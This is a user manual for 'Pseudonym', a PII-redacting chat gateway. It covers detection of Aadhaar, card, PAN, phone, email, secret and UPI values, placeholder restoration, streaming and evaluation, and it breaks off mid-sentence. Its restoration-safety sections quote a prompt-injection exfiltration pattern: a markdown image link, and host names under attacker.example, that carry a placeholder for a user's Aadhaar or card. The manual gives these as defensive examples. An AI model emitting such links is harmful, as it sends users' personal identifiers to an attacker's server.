# User manual

Everything about this project, written for someone who knows nothing about it
yet. Expanded as each phase adds real functionality — kept empty of
speculative content until then.

The [README](../README.md) is the short public overview: what Pseudonym
does, its measured results and its threat model. This manual goes phase by
phase into how each part works. Why each part works the way it does is in
the [decision record](decisions.md); how it is tested, in the
[testing guide](testing-guide.md); bugs found on the way, in the
[bug log](bug-log.md).

## Phase 0 — what exists right now

- A TypeScript (strict mode, ES modules, Node 22) project skeleton.
- Tooling: ESLint (flat config) + Prettier, Vitest + `@vitest/coverage-v8` +
  `fast-check`.
- `src/config/env.ts`: loads and validates process environment variables
  (`NODE_ENV`, `PORT`, `LOG_LEVEL`) with Zod, so a misconfigured deployment
  fails fast and loudly instead of silently doing the wrong thing.
- No detection, redaction, or gateway logic exists yet — that starts in
  Phase 1.

## Phase 1a — building blocks for detection (2026-09-28)

Nothing is detected yet. Phase 1a builds the pieces the detectors (Phase 1b)
stand on.

### Normalisation (`src/detection/normalise.ts`)

People write the same number in many ways that look alike on screen:
full-width digits (４１１１), Devanagari digits (४१११), "mathematical" digits
(𝟒𝟏𝟏𝟏), or plain digits with invisible characters between them. Detectors
should not have to know about all of these, so they run on a _normalised_
copy of the text:

1. Invisible characters (zero-width spaces, soft hyphens, direction marks,
   and everything else Unicode calls "default ignorable") are removed.
2. Unicode NFKC normalisation turns look-alike forms into their plain
   equivalents: full-width and mathematical digits become 0–9, a no-break
   space becomes a space, "é" written as e + accent becomes one "é".
3. Digits from every other script become 0–9: Devanagari (४), Bengali (৪),
   Tamil (௪), Urdu (۴), Thai (๔) and the rest, all 770 characters Unicode
   17.0 calls "decimal digits". The list of digit blocks is generated from
   the Unicode data of the Node in `.nvmrc` (`npm run gen:digits`); a test
   fails if a Node knows a digit the list lacks, and the generator refuses
   to run on a Node with an older Unicode.

```ts
const n = normalise('card ４１１１​1111 1111 1111');
n.text; // 'card 41111111 1111 1111'
n.toOriginal({ start: 5, end: 13 }); // { start: 5, end: 14 }: the 8 digits plus the hidden zero-width space
```

The important part is `toOriginal`. Pseudonym replaces values in the _original_
text, because that is what gets sent. `toOriginal` maps a span found in the
normalised text back to the original. It includes any invisible characters
inside the value, so a value hidden with zero-width characters is replaced
completely, with nothing left for the provider to reassemble.

### Check digits (`src/detection/verhoeff.ts`, `src/detection/luhn.ts`)

- **Verhoeff** is the check digit on Aadhaar numbers. It catches every
  single-digit typo and every swap of two neighbouring digits.
- **Luhn** is the check digit on card numbers. It catches every single-digit
  typo and most swaps, but not 09↔90.

Each has two functions: `…CheckDigit(payload)` computes the digit, and
`is…Valid(number)` checks a full number. About 1 in 10 random numbers passes
either check by chance, so a check digit on its own is weak evidence. Phase
1b uses context ("aadhaar", "card" nearby) to decide the borderline cases.

### Synthetic data (`src/synthetic/`)

Test data is generated, never real:

- `createRng(seed)` is a small seeded random-number generator. The same seed
  always gives the same data.
- `aadhaar`, `cardNumber`, `pan`, `email` and `indianMobile` each generate
  one value of that type that passes the relevant checks. Emails use domains
  reserved for examples. `ukDramaMobile` uses the range Ofcom reserves for TV
  drama. libphonenumber deliberately treats that range as _not_ valid, so
  those numbers only count as phones when a keyword is nearby.
- `obfuscate(value, rng)` disguises a value the way pasted text might, with
  mixed digit styles and invisible characters.

A random Aadhaar, card or Indian mobile number can happen to belong to a real
person. Generated values therefore only ever exist in memory while tests run:
they are never saved to files and never printed, not even when a test fails
(ADR-009).

## Phase 1b — detection (2026-09-28)

`detect(text)` (`src/detection/detect.ts`) finds personal values in a piece of
text and says **where** they are, never **what** they are:

```ts
detect('Card 4111 1111 1111 1111, mail priya@example.com');
// [
//   { type: 'CARD',  start: 5,  end: 24, validated: true,  context: true },
//   { type: 'EMAIL', start: 31, end: 48, validated: false, context: false },
// ]
```

Offsets point into the text exactly as it was given, even when the value was
disguised with other scripts' digits or invisible characters. Because a
detection holds no value, detections are safe to log and count.

### What is detected

| Type    | Shape                                                            | "Validated" means                                                                                                       |
| ------- | ---------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| Aadhaar | 12 digits, usually 4-4-4                                         | first digit 2–9 and a valid Verhoeff check digit                                                                        |
| Card    | 13–19 digits, usually 4-4-4-4                                    | valid Luhn and a known issuer (Visa, Mastercard, Amex, Discover, RuPay, Diners Club, JCB, UnionPay) at a length it uses |
| PAN     | 5 letters, 4 digits, 1 letter (any case)                         | 4th letter is a holder-type code (P, C, H, F, A, T, B, L, J, G)                                                         |
| Phone   | anything libphonenumber finds; no `+` means Indian               | valid for its country (libphonenumber, full metadata)                                                                   |
| Email   | local part, `@`, domain with a top-level domain; Unicode allowed | never: there is nothing to check                                                                                        |

### How a match is accepted (ADR-010)

- **Validated:** always redacted, keyword or not.
- **Unvalidated** (right shape, failed checks, e.g. a typo in the check
  digit): redacted only if a keyword for that type is within 40 characters,
  e.g. "Aadhaar", "UID", "card", "debit", "PAN", "call", "mobile", or the
  Hindi आधार, कार्ड, पैन, फ़ोन, मोबाइल.
- **Email:** always, on the pattern alone.

Each detection records `context: true` when a keyword was found, so later
measurements can see how much context matters.

### When two matches overlap (ADR-003)

1. validated beats unvalidated; 2. then the longer one wins; 3. then the
   fixed order Aadhaar > Card > PAN > Phone > UPI > Email > Secret > Number
   (the safety net). So a 16-digit card beats a
   valid Aadhaar hidden in its first 12 digits (rule 2), and a number that is
   both a valid phone and a valid Aadhaar is labelled Aadhaar (rule 3). It is
   redacted either way.

### Things it deliberately does not detect

- Values **glued to letters**, digits or underscores (`UID234567890123`)
  are not recognised as an Aadhaar, card or phone number: they are part of
  a longer token, and a hash or an API key should not be read as a phone
  number. (The safety net still takes the whole token if it has 9+ digits
  in a row; see below.)
- Digits glued to `@`: those belong to the email address or UPI ID around
  them.
- Emails written as "priya at example dot com", with quoted local parts, or
  with IP-literal domains.
- Aadhaar Virtual IDs (16 digits) and names: later phases. (Secrets, UPI
  IDs, IFSC codes and IP addresses: Phase 5b, see their sections below.)

### It fails closed

- Nothing is skipped for being long: a 50,000-character email address is
  detected whole, in linear time.
- A value found inside a longer number takes the whole number with it. In
  "Qty 2 4242 4242 4242 4242" the `2` is covered too, because it is joined to
  the card by a space. A comma or a word stops this.
- Phone numbers in a list are found one by one, whatever separates them
  (`, ` `;` `#` `x` `ext`). Phone extensions are not recognised: in
  "+1 202-555-0143 ext 12" the number is redacted and "12" is left as it is.
- **Safety net (ADR-011).** After every detector has run, any stretch of 9
  or more digits that none of them claimed is redacted as a generic
  `NUMBER`. Digits count across `.`, hyphens and dashes, brackets and `+`,
  but not spaces, and it does not matter what the digits touch. This
  catches bank account numbers, numbers glued together (`<a>-<b>`, bug-log 8) and numbers glued to letters. Since Phase 5b it takes **the whole
  token** the digits are glued into (letters, digits and underscores on
  both sides): `UID234567890123` and a 40-character hexadecimal token go
  whole, never with a piece cut out and the rest sent. It does not catch
  dates (`2024-09-28 14:30`), amounts (`Rs 1,25,000`) or short references.
  It does catch some things that are not personal: 9+-digit order IDs,
  tracking and build numbers, some IP addresses, hashes with a long digit
  stretch. Those are restored in the reply like any other value.

### Things it will sometimes get "wrong" on purpose

Luhn and Verhoeff each accept about 1 in 10 random numbers, so ordinary
numbers are sometimes redacted. Measured on random numbers: about 8.6% of bare
12-digit numbers are taken for an Aadhaar, and about 3.2% of 16-digit numbers
for a card. Every 10-digit number starting 6–9 is a valid Indian mobile, so
it is always treated as a phone. That is the chosen trade-off: the user still
sees the real number in the reply; only the model sees a placeholder.

## Phase 2 — redaction and restoration (2026-09-29)

Phase 2 turns detections into placeholders and back. It is still a library,
with no server: **nothing is redacted end to end until the gateway (Phase 3)
calls it.** All of it lives in `src/redaction/`.

### The per-request mapping

One `PlaceholderMapping` is created per request and thrown away when the
request ends. It is the only place real values live: never logged,
serialised or written to disk, and not encrypted (ADR-012: the key would sit
in the same process). Each type has its own counter, so the first Aadhaar is
`[AADHAAR_1]` and the first card is `[CARD_1]`.

### Redacting a conversation

```ts
const mapping = new PlaceholderMapping();
const sent = history.map((message) => redactMessage(message, mapping));
```

Call `redactMessage` once per message, in order, with the same mapping.
Because a chat request always resends the whole history, this gives the same
output every time for the same history, and adding a message never changes
the placeholders in earlier ones. No state is kept between requests.

The same value written differently gets one placeholder. Aadhaar, card and
long numbers compare by digits, PAN ignores case, email ignores case, and a
phone number compares in international form (no `+` means Indian). The value
restored is the first way it was written.

### Text that already looks like a placeholder

- **`[AADHAAR_1]`, `[pan 1]`, `[Literal_2]` typed by the user** (a bracket,
  a known tag in any case, `_` or a space, an index 1–9999 with no leading
  zero) become `[LITERAL_1]`, `[LITERAL_2]` …, and come back exactly as typed.
  `[PAN_01]` or `[PAN_10000]` are not placeholder-shaped and are left alone.
- **`Card_1` or `PAN_1` typed as ordinary words** is not replaced. It
  _reserves_ that number: a real card then becomes `[CARD_2]`, so the model
  can never confuse the two. If `[CARD_1]` was already given out in an
  earlier message, it keeps its number, and from then on only the bracket
  form `[CARD_1]` restores, not a bare `CARD_1`.
- **`Card 1` or `CARD 1` with a space** reserves nothing (see below).
- **Known limitation: a secret right after a credential word and such a
  text with a space in it is sent as written.** In `password: [pan 1]` +
  a password, the password is not redacted: the keyword's value is read
  from inside `[pan 1]` and ends at its space, so the password after it is
  never read. With no space (`password: [PAN_1]` + a password) it is
  redacted. In the generated evaluation set's `glued-literal` shape this
  is 3 of 108 values (measured on 2026-10-07). Two fixes were built and
  measured and both sent values that are redacted today, so it is left as
  it is (ADR-038, bug-log 61).

### Restoring the answer

`restore(reply, mapping)` turns placeholders back into real values. The
model sometimes rewrites them, so it also accepts:

| Form                     | Case                    | For                      |
| ------------------------ | ----------------------- | ------------------------ |
| `[CARD_1]`, `[card 1]`   | any                     | every type               |
| `CARD_1`, `Card_1`       | UPPERCASE or Title Case | every type               |
| `AADHAAR 1`, `Aadhaar 1` | UPPERCASE or Title Case | Aadhaar and LITERAL only |

"Card 1", "Pan 1", "Number 1", "Phone 1" or "Email 1" (any case) are never
restored: they are ordinary English ("Card 1 is declined", "our Number 1
priority"). The cost: a model that rewrites `[CARD_1]` as "Card 1" leaves it
unrestored in the answer. Phase 5/6 will measure how often that happens.

Anything that is not in this request's mapping (`[CARD_7]` the model made
up, `[CARD_10]` when only `[CARD_1]` exists) is left exactly as written.

### Restoration safety

By default a placeholder inside a URL, a markdown link or image target, or a
quoted HTML attribute is **not** restored. Otherwise an injected instruction
could make the model write `![x](https://attacker.example/?d=[AADHAAR_1])`,
and the user's own app would send the real Aadhaar to that server when it
shows the image. It is pattern matching, not a parser, so it errs towards
leaving more placeholders unrestored. Pass `{ restoreInUnsafeRegions: true }`
to switch it off. Its known gaps (all things a client does not fetch on its
own) are listed in `src/redaction/unsafe-regions.ts`, each pinned by a
negative test in `unsafe-regions.test.ts`; the README's threat model gains
the list in Phase 8.
It protects against this one trick only, not against prompt injection in
general.

### Limits

- At most 9,999 different values of one type per request; the next one
  throws `PlaceholderLimitError` (the gateway turns it into a 422).
- Person names are not detected until Phase 6.

## Phase 3 — the gateway (2026-09-29)

Pseudonym now runs as a server. An app sends it an OpenAI-style chat request;
Pseudonym redacts it, forwards it to Ollama, restores the answer and sends
it back. This section describes the non-streaming path; streaming arrived
in Phase 4b (see below).

### Running it

1. Install Ollama (ollama.com) and pull a model, e.g. `ollama pull qwen3:4b-instruct-2507-q4_K_M` (the demo model).
2. Copy `.env.example` to `.env` and set `PSEUDONYM_MODEL` to that model's
   name. It is required; there is no default.
3. `npm run dev` (development, TypeScript directly), or `npm run build`
   then `npm start` (compiled; runs `node --disable-sigusr1`).
4. Point the app at `http://127.0.0.1:3000/v1` and **send the same model
   name** in each request's `model` field.

In PowerShell, a quick check:

```powershell
$body = '{"model":"qwen3:4b-instruct-2507-q4_K_M","messages":[{"role":"user","content":"My card 4111 1111 1111 1111 was charged twice."}]}'
Invoke-RestMethod -Method Post -Uri http://127.0.0.1:3000/v1/chat/completions -ContentType 'application/json' -Body $body
```

Node 22.20 or newer is required (`.nvmrc` says 22.23.3). It listens on
`127.0.0.1` only, unless `HOST` says otherwise.

### Configuration (`.env` or the environment)

| Variable                                | Default                                  | Meaning                                                                                                                       |
| --------------------------------------- | ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| `PSEUDONYM_MODEL`                       | none (required)                          | The model Ollama runs; requests must name it exactly                                                                          |
| `PSEUDONYM_PROVIDER`                    | `ollama`                                 | The only provider so far                                                                                                      |
| `PSEUDONYM_PROVIDER_BASE_URL`           | `http://localhost:11434/v1`              | Ollama's OpenAI-compatible API                                                                                                |
| `PSEUDONYM_PROVIDER_API_KEY`            | unset                                    | Sent as `Authorization: Bearer …` only if set (local Ollama ignores it)                                                       |
| `PSEUDONYM_PROVIDER_TIMEOUT_MS`         | 120000                                   | How long to wait for the model: the whole call, or when streaming each wait (Phase 4b)                                        |
| `PSEUDONYM_MAX_BODY_BYTES`              | 262144 (256 KiB)                         | Larger requests get a 413 (ADR-015)                                                                                           |
| `PSEUDONYM_MAX_RESPONSE_BYTES`          | 1048576 (1 MiB)                          | The most of a non-streamed provider answer Pseudonym reads (Phase 4b, ADR-020)                                                |
| `PSEUDONYM_MAX_STREAM_BYTES`            | 33554432 (32 MiB)                        | The most of a streamed provider answer Pseudonym reads, counted on the wire (ADR-020 amendment)                               |
| `PSEUDONYM_RESTORE_IN_UNSAFE_REGIONS`   | `false`                                  | `true` restores inside URLs too (not recommended)                                                                             |
| `PSEUDONYM_PLACEHOLDER_INSTRUCTION`     | `false`                                  | Adds a short system message asking the model to copy placeholders exactly (ADR-017; off since it did not help the demo model) |
| `PSEUDONYM_NAMES`                       | unset (off)                              | `true` turns person names on (Phase 6, ADR-037); until the name model is built in, the gateway then refuses to start          |
| `HOST`, `PORT`, `LOG_LEVEL`, `NODE_ENV` | `127.0.0.1`, 3000, `info`, `development` | The usual                                                                                                                     |

A wrong value stops the server at start-up with a message naming the
variable, never its value.

### What a request may contain

Accepted: `model`, `messages` with roles `system`, `user`, `assistant` and
text content (a string, or an array of `{"type": "text", "text": …}` parts),
and numeric or enum settings (`temperature`, `top_p`, `max_tokens`,
`max_completion_tokens`, `seed`, the two penalties, `reasoning_effort`,
`response_format` `text`/`json_object`, `stop`). `null` means unset.

Redacted before sending: every message's text, and `stop`. Text parts are
joined with a space into one string.

Silently dropped: `user` and `safety_identifier` (they identify the end user
to the provider).

Rejected with a 400 and a message saying why: a message
`name`, tool calls and tool messages, images/audio/files, the `developer`
role, `metadata`/`store`, logprobs, `n` other than 1, `json_schema`
response formats, a `model` other than `PSEUDONYM_MODEL`, and any field not
listed above. Errors never quote what you sent.

### What comes back

An OpenAI-shaped `chat.completion`: `id`, `object`, `created`, `model`, one
choice with the restored `content` and `finish_reason`, and `usage`.
Nothing else from the provider is passed on (a thinking model's reasoning is
dropped).

**A refusal** the provider names in its own `refusal` field comes back as
OpenAI sends one: `content: null` and the refusal text, restored like any
model text (restoration safety included), in `message.refusal`. If the
provider sent text in `content` as well, both are passed on. The `refusal`
key is present only on a refusal; OpenAI also sends `refusal: null` on
ordinary answers, which Pseudonym does not. An answer that names no
refusal and has empty text is passed on as an empty answer; with
`content: null` it is a 502 `provider_bad_response`. What either should
become is an open decision (ADR-041 section 15). Neither
Ollama nor Gemini has been seen to send a `refusal` field.

Errors use OpenAI's shape, `{"error": {"message", "type", "param", "code"}}`:

| Status | When                                                                                                                                                              |
| ------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 400    | invalid or unsupported request (codes `invalid_json`, `invalid_request`, `unsupported_feature`, `model_not_found`; `stream_not_supported` existed until Phase 4b) |
| 404    | any other endpoint                                                                                                                                                |
| 413    | body over the limit                                                                                                                                               |
| 415    | not `application/json` (a `charset` parameter is fine)                                                                                                            |
| 422    | more than 9,999 different values of one type in one request (`too_many_values`)                                                                                   |
| 500    | Pseudonym's own bug (`internal_error`)                                                                                                                            |
| 502    | the provider failed, answered with an error, or answered with something unusable. Its own error message is never passed on: it can echo the prompt                |
| 504    | the provider did not answer within the timeout                                                                                                                    |

### Logs

One JSON line per request start and end: method, route pattern (never the
URL), status, time taken, request id. Failures add the error's name and
code, never its message. Request and response bodies are never logged.

### Production

With `NODE_ENV=production`, Pseudonym checks at start-up that nothing can
copy its memory out: no inspector or heap-snapshot or report flags (in the
command line or `NODE_OPTIONS`), and on Linux `--disable-sigusr1` set and
core dumps off (`ulimit -c 0`). If any check fails it refuses to start.
It warns if the host pipes core dumps to a handler (which ignores the
limit), and on Windows or macOS, where none of this can be verified.
Production is meant to run on Linux (Docker in Phase 8). ADR-016.

### Known limits

- A number split across two messages is not detected. (A number with a
  line break between its digit groups was not detected either until
  Phase 5c item 4; see "Numbers wrapped onto the next line" below.)
- Names and API keys in messages are sent as written until Phases 6 and 5.
- Redaction blocks the server while it runs: about 0.25 s for a 256 KiB
  chat, about 1 s for 256 KiB of dense numbers.

## Phase 4a — streaming restoration (2026-09-29)

Phase 4a makes restoration work on an answer that arrives in pieces. The
gateway does not stream yet (`stream: true` is still rejected); that is
Phase 4b. What exists now is the engine, in `src/redaction/`.

### Restoring a stream

```ts
const restorer = new StreamRestorer(mapping);
for await (const piece of answer) send(restorer.push(piece));
send(restorer.end());
```

`push` returns the restored text that is already decided; `end` returns the
rest when the answer is complete or has been cut off. Whatever the pieces,
the result is exactly what `restore()` gives for the whole answer:
`restore()` is itself one `push` plus `end`.

A piece may end in the middle of a placeholder (`[CAR` + `D_1]`,
`Aadhaar` + ` 1`), so the restorer holds back the end of the text while it
could still become one. Everything else goes out at once: `Hello` is sent
immediately, `Email` waits for one more character (it could be
`Email_1`), `[CARD_1` waits for the next character (it could be
`[CARD_10]`). It never holds more than 16 characters: `[PASSPORT_9999]` and a
"." after it. It never sends half of a character that takes two UTF-16
code units (an emoji, a mathematical letter).

### Restoration safety changed slightly

To decide about a placeholder before the rest of the answer exists, every
rule now looks only at the text before it (ADR-018). Each change is more
cautious than before, so a few more placeholders stay unrestored; none of
them was ever a leak:

- a quoted HTML value that never closes (`src="…` with no closing quote)
  now counts until the end of the answer;
- an unclosed `<…` link destination counts until the end of its line;
- **the host rule:** a placeholder followed by what would make its value
  part of a web address stays a placeholder: `Aadhaar 1.attacker.example`,
  `CARD_1-x.attacker.example`, `[CARD_1].attacker.example`. A full stop
  followed by a space or the end of the text is fine (`… is Aadhaar 1.`),
  and so is `[PAN_1]-linked`.

The check is also faster: it reads each character once (bug-log 16), where
some answers used to take seconds.

## Phase 4b — the streaming endpoint (2026-09-29)

`stream: true` now works. Ask for it the way you would ask OpenAI; the
OpenAI SDKs' `stream: true` needs no other change.

```powershell
$body = '{"model":"qwen3:4b-instruct-2507-q4_K_M","stream":true,"messages":[{"role":"user","content":"Email asha@example.org a summary"}]}'
Set-Content -Path body.json -Value $body -NoNewline
curl.exe -N http://127.0.0.1:3000/v1/chat/completions -H "content-type: application/json" --data-binary "@body.json"
```

Use `curl.exe` (built into Windows), not `curl`, which in Windows PowerShell
is an alias for `Invoke-WebRequest`; `-N` shows events as they arrive, where
`Invoke-RestMethod` would wait for the whole stream. The body goes through
a file because Windows PowerShell 5.1 strips the quotes inside an argument
passed to a native program.

### What comes back

`content-type: text/event-stream`, one `data: {…}` line per event, in
OpenAI's `chat.completion.chunk` shape with Pseudonym's model name:

1. a first chunk with `delta: {"role": "assistant", "content": ""}`;
2. chunks with `delta: {"content": "…"}`, already restored. A placeholder
   split across the model's pieces (`[EMA` + `IL_1]`) comes out whole, as
   the real value; text is held back only while it could still become a
   placeholder (at most 16 characters);
   a refusal the provider names comes as `delta: {"refusal": "…"}` chunks,
   restored the same way, as a text of its own;
3. a chunk with `delta: {}` and `finish_reason`;
4. with `"stream_options": {"include_usage": true}`: every chunk above has
   `"usage": null`, and one more chunk with `"choices": []` carries the
   token counts;
5. `data: [DONE]`.

Restoration safety is the same as without streaming: a streamed answer and
a non-streamed answer to the same model text read exactly the same.

### When something goes wrong

- **Before the first chunk** (the provider is down, answers with an error,
  takes longer than the timeout to start, or sends something that is not a
  stream): an ordinary JSON error with the usual status (502 or 504), as
  without streaming.
- **After the stream has started:** the status is already 200 and cannot
  change. You get everything that was already decided (including the few
  held-back characters, restored), then one `data: {"error": {…}}` event
  with the same fixed messages and codes as the HTTP errors, and **no
  `[DONE]`**. The OpenAI SDKs raise that as an exception. Causes: the
  provider's stream was cut off or ended without saying it was done
  (`provider_bad_response`), it sent an error (`provider_error`), it went
  quiet for longer than the timeout (`provider_timeout`), or it sent more
  than the response limit (`provider_response_too_large`).
- **If you disconnect,** Pseudonym stops the provider's work straight away.

### Timeouts and limits

- `PSEUDONYM_PROVIDER_TIMEOUT_MS` (default 2 minutes) applies to **each
  wait** when streaming: for the first chunk, then between chunks. A long
  answer that keeps arriving is never cut off by it. Without streaming it
  is still one limit for the whole call.
- `PSEUDONYM_MAX_RESPONSE_BYTES` (default 1 MiB) is the most of a
  non-streamed answer Pseudonym will read. That answer is held in memory
  whole, so this stays small; 1 MiB is still about 250,000 tokens.
- `PSEUDONYM_MAX_STREAM_BYTES` (default 32 MiB) is the most of a streamed
  answer. It counts bytes on the wire, and when streaming each token
  arrives wrapped in 195 bytes of JSON plus the model name (210 for a
  reasoning token), so 1 MiB would be only about 5,000 tokens. A
  32,768-token answer after as many reasoning tokens is 13.4 to 16.3 MiB;
  32 MiB is the next power of two that holds it (about 130,000 to 160,000
  tokens). A stream is never held in memory whole, so this large number
  is not a memory risk (ADR-020 amendment).
- One streamed event may be at most 64 KiB (Ollama's are about 200 bytes).

### Not yet checked against a real Ollama

The stream format was built from Ollama's source code and tested against a
mock that writes it the same way. Recording a real Ollama stream as a test
fixture is a follow-up once Ollama is installed.

## Measuring detection: the evaluation (Phase 5a)

The promise says detection is "measured and published, per data type".
`npm run eval` is that measurement.

### The two datasets

- **Generated:** 600 synthetic messages (support tickets, emails, chats,
  pasted records; English, Hinglish, Hindi and mixed), built in memory from
  one seed on every run. Every personal value in them is labelled, and so is
  every lookalike (an order number, a timestamp, a PAN-shaped product code).
  The same person wrote this generator and the detectors, so it is good at
  showing that something broke and weak at showing what nobody thought of.
- **Held-out:** 58 messages in 54 cases. Stated exactly: drafted with AI
  assistance in a separate session that did not write the detectors, then
  reviewed by the project's author. It is blind (no case was run against the
  detectors before the set was committed), it was committed before the newer
  detectors existed, and it is never used to tune them. It lives in
  `eval/held-out.txt`; its format is in `eval/HELD-OUT-FORMAT.md`. It is not
  "hand-written" and not "by someone else", and no document may call it
  that. Whoever works on the detectors does not read it, and the tools print
  counts, never its text.

Neither dataset contains a personal value. A message says
`{{AADHAAR:#### #### ####}}`, and a valid number is generated in memory when
the evaluation runs.

### Reading the table

| Column                 | Meaning                                                                                     |
| ---------------------- | ------------------------------------------------------------------------------------------- |
| Values                 | How many personal values of that type are labelled                                          |
| Redacted (any type)    | Every character of the value was inside a detection. This is the privacy number             |
| Partly redacted        | Some characters were covered and some were not: a leak, counted as not redacted             |
| Recall (right type)    | Redacted, and recognised as its own type (an Aadhaar as `AADHAAR`, not as a generic number) |
| Precision (right type) | Of the detections of that type, how many covered a value of that type                       |
| F1                     | The usual combination of those two                                                          |
| Over-redactions        | Detections that covered nothing personal. No privacy cost; the text was fine to send        |

Percentages are cut to one decimal, never rounded up, and the counts are
always shown.

### The baseline is the threshold

`eval/baseline.json` holds the counts of the last accepted run. Both
datasets give the same text every time, so:

- a count that gets **worse** fails `npm run eval`. To accept it on purpose:
  `npx tsx eval/run.ts --update --accept "ADR-0xx: why"`; the note and the
  changed counts stay in the file's history;
- a count that gets **better** also fails, until
  `npx tsx eval/run.ts --update` makes it the new floor. That keeps the file
  and the README table current;
- the README table between the `eval:start` and `eval:end` markers is
  generated from that file. Do not edit it by hand: the run fails if it
  differs.

The held-out set joined the baseline with its first measurement
(`npx tsx eval/run.ts --update --with-held-out`, 2026-09-30). From then on,
changing the file changes the dataset and needs a note.

Commands with a flag call `tsx` directly because `npm run eval -- --update`
does not work in PowerShell: it drops the `--`, and npm keeps the flag.

### What the datasets cannot measure yet

The slot format has no way to write a number in words ("nine eight
seven…"), letters standing in for digits in scanned text (O for 0, l for
1), a postal address or a vehicle number. So none of these is labelled,
measured or detected. Phase 5d (part 5, 2026-10-02) kept them as
documented gaps rather than extending the format: they are listed in
`eval/HELD-OUT-FORMAT.md` ("Not expressible yet") and in the README's
known gaps and threat model. A probe outside the datasets showed what a
letter for a digit does: the value is never recognised as its type, and
is replaced only when 9 or more digits are left in one stretch (208 of
494 Aadhaar numbers, 403 of 500 cards, 0 of 489 mobiles). Short personal identifiers (a
passport or voter ID number, a date of birth) have had detectors since
Phase 5c item 5, but only next to a word naming them; see their section.

## Secrets (Phase 5b, 2026-09-30)

API keys, tokens, private keys and passwords are replaced with
`[SECRET_1]`, `[SECRET_2]`… and restored in the answer like any other
value. The code is `src/detection/secret.ts` (ADR-022).

### Two ways of finding a secret

**1. A known format.** A provider's published prefix, then its alphabet,
at least a minimum length. Found anywhere, with no keyword needed:

| Provider                     | Starts with                                              |
| ---------------------------- | -------------------------------------------------------- |
| OpenAI, Anthropic and others | `sk-` (20+ characters, with a digit or a capital)        |
| GitHub                       | `ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_`, `github_pat_`    |
| GitLab                       | `glpat-`                                                 |
| AWS access key ID            | `AKIA`, `ASIA`                                           |
| Stripe                       | `sk_live_`, `sk_test_`, `rk_live_`, `rk_test_`, `whsec_` |
| Razorpay                     | `rzp_live_`, `rzp_test_`                                 |
| Slack                        | `xoxb-`, `xoxp-` and the other `xox?-` tokens, `xapp-`   |
| Google                       | `AIza`                                                   |
| npm, Hugging Face            | `npm_`, `hf_`                                            |
| JSON Web Token               | two parts starting `eyJ`, joined by a dot                |
| Private key                  | a `BEGIN … PRIVATE KEY` block, to its END line           |

A key longer than its format is taken whole. A key glued to a letter,
digit or underscore before it is not taken as a key (it is part of some
other token). A Stripe publishable key (`pk_live_…`) is public by design
and left alone.

**2. A keyword assignment.** A credential word directly followed by a
value:

```
password: Monsoon#2024          api_key=a1b2c3
My password is Monsoon#2024     Authorization: Bearer abc123def456
Mera password Barsaat@77 hai    मेरा पासवर्ड Barsaat@77 है
DB_PASSWORD=hunter              "password": "sunshine"
OTP 482913 aaya tha             my ATM PIN is 4821
```

Words: password, passwd, pwd, passphrase, secret, token, bearer, api key,
api secret, api token, access key, secret key, private key, auth token,
पासवर्ड, टोकन. For numeric codes: OTP, PIN, mPIN, CVV, CVC, passcode,
ओटीपी, पिन. Between the word and the value there may be "is", "was",
"hai", "tha", "है", "था", a spaced dash, and `:` or `=`. The value is the
text up to the next blank, without closing punctuation.

### When a value after a keyword is taken

"My password is wrong" looks just like "my password is hunter2". So the
value is taken only when the way it is written says it is one:

| Written as                                            | Taken?                                                                                              |
| ----------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| after `=` (`password=sunshine`)                       | always                                                                                              |
| in quotes (`password is "sunshine"`)                  | always                                                                                              |
| after `:` and last on its line (`Password: sunshine`) | always                                                                                              |
| anywhere else                                         | only if it looks like a secret: 6+ characters with a digit or one of `@ # $ % ^ & * ! + = ~ \| < >` |
| after OTP, PIN, CVV…                                  | also 3 to 8 digits                                                                                  |

So `My password is wrong`, `Password reset link not received` and `The
token expired yesterday` are left alone.

### What is not found

There is no entropy scanning: Pseudonym does not guess that a string "looks
random". These are sent as written:

- a random string with no known prefix and no credential word before it
  ("I pasted 3f9a… into the chat by mistake");
- a password made only of letters, written in a sentence ("my password is
  sunshine");
- a value that does not directly follow its keyword ("the password for the
  portal is …", "… is my password");
- a header line with the values on the next line (`Name,Password` then
  `priya,…`);
- the rest of a passphrase after its first word;
- credentials inside a URL (`postgres://user:password@host`).

### What it sometimes takes though it is not a secret

- A word standing alone after a keyword and a colon: `Token: expired` on a
  line of its own becomes `Token: [SECRET_1]`.
- Anything with a digit right after a keyword: `password 12/05/2026 ko
badla` takes the date; `pin 560001` takes a postal code.

Both are restored in the answer; the model just does not see them.

### The same secret twice

A secret is compared exactly as written, case included. The same key
twice gets one placeholder; the same letters in another case get another.

## UPI IDs (Phase 5b, 2026-10-01)

A UPI ID (virtual payment address) is a name or a mobile number, `@`, and
the handle of the app or bank that issued it: `<name>@okaxis`,
`<mobile>@ybl`. Each one becomes `[UPI_1]`, `[UPI_2]`… and is restored in
the answer. The code is `src/detection/upi.ts` (ADR-024).

### Known handle: always found

If the handle is on Pseudonym's list, the ID is found wherever it is, with
no keyword needed. The list has 54 handles: Google Pay (`okaxis`,
`okhdfcbank`, `okicici`, `oksbi`), PhonePe (`ybl`, `ibl`, `axl`), Paytm
(`paytm`, `ptyes`, `ptaxis`, `pthdfc`, `ptsbi`), Amazon Pay (`apl`, `yapl`,
`rapl`), BHIM (`upi`), WhatsApp, CRED, Groww, MobiKwik and others, and
banks' own handles (`sbi`, `icici`, `hdfcbank`, `kotak`…). Case does not
matter.

### Any other handle: only with a keyword

`<name>@<handle>` with a handle not on the list has the same shape as
`user@localhost` or `react@latest`, so it is taken only when one of these
words is within 40 characters: UPI, VPA, BHIM, GPay, Google Pay, PhonePe,
Paytm, Amazon Pay, यूपीआई. ("Phone pe" is not one: in Hinglish it also
means "on the phone".)

### UPI ID or email?

| Text                                                      | Found as                     |
| --------------------------------------------------------- | ---------------------------- |
| `<name>@okaxis`                                           | UPI ID                       |
| `My UPI ID is <name>@okaxis.` (full stop after it)        | UPI ID                       |
| `<name>@okaxis.com`, `<name>@paytm.co.in`                 | email (it has a domain)      |
| `<name>@example.com`, even right after "UPI"              | email                        |
| `Pay <name>@ybl and mail <name>@example.com`              | one UPI ID, one email        |
| `<name>@okaxis.In future…` (no space after the full stop) | email, covering the whole ID |

The rule: if what follows the `@` is an email domain (by the email
detector's own pattern), it is an email; otherwise it can be a UPI ID. The
